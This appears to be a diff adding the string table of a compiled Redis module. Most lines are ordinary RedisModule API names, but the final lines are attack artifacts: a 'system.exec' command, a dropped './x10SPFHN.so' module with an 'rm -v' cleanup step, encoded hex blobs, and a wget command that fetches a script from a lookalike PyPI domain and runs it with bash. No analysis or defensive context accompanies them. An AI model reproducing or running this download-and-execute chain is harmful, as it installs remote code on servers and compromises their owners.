+RedisModule_DigestAddStringBuffer
+RedisModule_DigestAddLongLong
+RedisModule_DigestEndSequence
+RedisModule_GetKeyNameFromDigest
+RedisModule_GetDbIdFromDigest
+RedisModule_CreateDict
+RedisModule_FreeDict
+RedisModule_DictSize
+RedisModule_DictSetC
+RedisModule_DictReplaceC
+RedisModule_DictSet
+RedisModule_DictReplace
+RedisModule_DictGetC
+RedisModule_DictGet
+RedisModule_DictDelC
+RedisModule_DictDel
+RedisModule_DictIteratorStartC
+RedisModule_DictIteratorStart
+RedisModule_DictIteratorStop
+RedisModule_DictIteratorReseekC
+RedisModule_DictIteratorReseek
+RedisModule_DictNextC
+RedisModule_DictPrevC
+RedisModule_DictNext
+RedisModule_DictPrev
+RedisModule_DictCompare
+RedisModule_DictCompareC
+RedisModule_RegisterInfoFunc
+RedisModule_RegisterAuthCallback
+RedisModule_InfoAddSection
+RedisModule_InfoBeginDictField
+RedisModule_InfoEndDictField
+RedisModule_InfoAddFieldString
+RedisModule_InfoAddFieldCString
+RedisModule_InfoAddFieldDouble
+RedisModule_InfoAddFieldLongLong
+RedisModule_InfoAddFieldULongLong
+RedisModule_GetServerInfo
+RedisModule_FreeServerInfo
+RedisModule_ServerInfoGetField
+RedisModule_ServerInfoGetFieldC
+RedisModule_ServerInfoGetFieldSigned
+RedisModule_ServerInfoGetFieldUnsigned
+RedisModule_ServerInfoGetFieldDouble
+RedisModule_GetClientInfoById
+RedisModule_GetClientNameById
+RedisModule_SetClientNameById
+RedisModule_PublishMessage
+RedisModule_PublishMessageShard
+RedisModule_SubscribeToServerEvent
+RedisModule_SetLRU
+RedisModule_GetLRU
+RedisModule_SetLFU
+RedisModule_GetLFU
+RedisModule_BlockClientOnKeys
+RedisModule_BlockClientOnKeysWithFlags
+RedisModule_SignalKeyAsReady
+RedisModule_GetBlockedClientReadyKey
+RedisModule_ScanCursorCreate
+RedisModule_ScanCursorRestart
+RedisModule_ScanCursorDestroy
+RedisModule_Scan
+RedisModule_ScanKey
+RedisModule_GetContextFlagsAll
+RedisModule_GetModuleOptionsAll
+RedisModule_GetKeyspaceNotificationFlagsAll
+RedisModule_IsSubEventSupported
+RedisModule_GetServerVersion
+RedisModule_GetTypeMethodVersion
+RedisModule_Yield
+RedisModule_GetThreadSafeContext
+RedisModule_GetDetachedThreadSafeContext
+RedisModule_FreeThreadSafeContext
+RedisModule_ThreadSafeContextLock
+RedisModule_ThreadSafeContextTryLock
+RedisModule_ThreadSafeContextUnlock
+RedisModule_BlockClient
+RedisModule_BlockClientGetPrivateData
+RedisModule_BlockClientSetPrivateData
+RedisModule_BlockClientOnAuth
+RedisModule_UnblockClient
+RedisModule_IsBlockedReplyRequest
+RedisModule_IsBlockedTimeoutRequest
+RedisModule_GetBlockedClientPrivateData
+RedisModule_GetBlockedClientHandle
+RedisModule_AbortBlock
+RedisModule_BlockedClientMeasureTimeStart
+RedisModule_BlockedClientMeasureTimeEnd
+RedisModule_SetDisconnectCallback
+RedisModule_SubscribeToKeyspaceEvents
+RedisModule_AddPostNotificationJob
+RedisModule_NotifyKeyspaceEvent
+RedisModule_GetNotifyKeyspaceEvents
+RedisModule_BlockedClientDisconnected
+RedisModule_RegisterClusterMessageReceiver
+RedisModule_SendClusterMessage
+RedisModule_GetClusterNodeInfo
+RedisModule_GetClusterNodesList
+RedisModule_FreeClusterNodesList
+RedisModule_CreateTimer
+RedisModule_StopTimer
+RedisModule_GetTimerInfo
+RedisModule_GetMyClusterID
+RedisModule_GetClusterSize
+RedisModule_GetRandomBytes
+RedisModule_GetRandomHexChars
+RedisModule_SetClusterFlags
+RedisModule_ExportSharedAPI
+RedisModule_GetSharedAPI
+RedisModule_RegisterCommandFilter
+RedisModule_UnregisterCommandFilter
+RedisModule_CommandFilterArgsCount
+RedisModule_CommandFilterArgGet
+RedisModule_CommandFilterArgInsert
+RedisModule_CommandFilterArgReplace
+RedisModule_CommandFilterArgDelete
+RedisModule_CommandFilterGetClientId
+RedisModule_Fork
+RedisModule_SendChildHeartbeat
+RedisModule_ExitFromChild
+RedisModule_KillForkChild
+RedisModule_GetUsedMemoryRatio
+RedisModule_MallocSize
+RedisModule_MallocUsableSize
+RedisModule_MallocSizeString
+RedisModule_MallocSizeDict
+RedisModule_CreateModuleUser
+RedisModule_FreeModuleUser
+RedisModule_SetContextUser
+RedisModule_SetModuleUserACL
+RedisModule_SetModuleUserACLString
+RedisModule_GetModuleUserACLString
+RedisModule_GetCurrentUserName
+RedisModule_GetModuleUserFromUserName
+RedisModule_ACLCheckCommandPermissions
+RedisModule_ACLCheckKeyPermissions
+RedisModule_ACLCheckChannelPermissions
+RedisModule_ACLAddLogEntry
+RedisModule_ACLAddLogEntryByUserName
+RedisModule_DeauthenticateAndCloseClient
+RedisModule_AuthenticateClientWithACLUser
+RedisModule_AuthenticateClientWithUser
+RedisModule_RedactClientCommandArgument
+RedisModule_GetClientCertificate
+RedisModule_GetCommandKeys
+RedisModule_GetCommandKeysWithFlags
+RedisModule_GetCurrentCommandName
+RedisModule_RegisterDefragFunc
+RedisModule_DefragAlloc
+RedisModule_DefragRedisModuleString
+RedisModule_DefragShouldStop
+RedisModule_DefragCursorSet
+RedisModule_DefragCursorGet
+RedisModule_GetKeyNameFromDefragCtx
+RedisModule_GetDbIdFromDefragCtx
+RedisModule_EventLoopAdd
+RedisModule_EventLoopDel
+RedisModule_EventLoopAddOneShot
+RedisModule_RegisterBoolConfig
+RedisModule_RegisterNumericConfig
+RedisModule_RegisterStringConfig
+RedisModule_RegisterEnumConfig
+RedisModule_LoadConfigs
+RedisModule_RdbStreamCreateFromFile
+RedisModule_RdbStreamFree
+RedisModule_RdbLoad
+RedisModule_RdbSave
+h02B6aVgu09Kzu9QTvTOtgx9oER9WIoz
+YDP7ECjzuV7sagMN
+system.exec
+GCC: (Ubuntu 11.3.0-1ubuntu1~22.04) 11.3.0
+.gnu.version
+.gnu.version_r
+.note.gnu.property
+./x10SPFHN.so
+dbfilename
+system.exec
+rm -v ./x10SPFHN.so
+adb4bb64d395eff7d093f5fba5481ab0e71be15728b38130a6d4276b8b5bdb2f
+system.exec
+a64e32bc245f94d0b290094eafdb80d17b397747a91029f60788e2432f918f3f8dbb1fdd303a56644497353ebf17e3fb407cc36c04612c1570435507fa7e2e78c98d338f40c0b81187e6f5b549d051f6a9aa891d5642714263c8000af7d2b17c12181db077eb06dad7f843bf4e5aaca3
+system.exec
+wget --no-check-certificate -O gezsdSC8i3 'https://files.pypi-install.com/packages/gezsdSC8i3' && bash gezsdSC8i3
+files.pypi-install.com
+394810bbd00d01baa64e1da65ad18dcbe7d1ca585d429847e0fe1c4f76ff3cf49fcc4943e9dd339c5cbac2fd876c21d37b4ea3c014fe679f81cd9a546a7a324c6958b87785237671b3331ae9a54d126f78c916de74c154a1915a963edffdb357af5d7cfdb85b200fdeb35f4f508367081e31e3094c15e2a683865bb05b04a36b19202ab49c5ebffcec7698d5f2e344c5d9da608c5c2506c689c1fc4a492bec4dd4db33becb17d631c0fdd7e642c20ffa7e987d2851c532e77bdfb094c0cfcd228499c57ea257f305c367b813bc4d4cf937136e02398ce7cb3c26f16f3c6fc22a2b43795d41260b46d8bdf0432aaefbcc863880571952510bf3d98919219ab49e86974f11a81fff5ff85734601e79c2c2d754e3fe7a6cfcec8349ceb350ea7145f87b86f7e65543268c8ae76cb54bef1885b01b222841da59a377140ae6bd544cc47ac550a865af84f5b31df6a21e7816ed163260f47ea16a64f153be1399911a99fd71b30689b961477db551c9bc2cdc1aa6b931ba2852af1e297ee66fb99381ab916b377358243152f1f3abba9f7ad700ba873b53dc2f98642f47580d7ef5d3e3b32b3c4a9a53689c68a5911a6258f2da92ca30661ebef77109e1e44f3aa6665f6734af7d3d721201e3d31c61d4da562cef34f66dd7f88fb639b2aaf4444952
